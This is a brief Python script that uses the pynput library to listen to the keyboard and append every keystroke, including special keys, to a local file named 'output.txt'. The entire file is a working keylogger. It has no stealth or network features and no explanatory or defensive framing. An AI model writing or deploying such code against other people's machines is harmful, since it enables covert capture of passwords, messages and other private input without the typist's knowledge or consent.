from pynput import keyboard

# Output file
output_file = "output.txt"

# Function to write to file
def on_press(key):
    try:
        with open(output_file, 'a') as f:
            f.write(f"{key.char} ")
    except AttributeError:
        with open(output_file, 'a') as f:
            f.write(f"[{key}] ")

# Start script
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()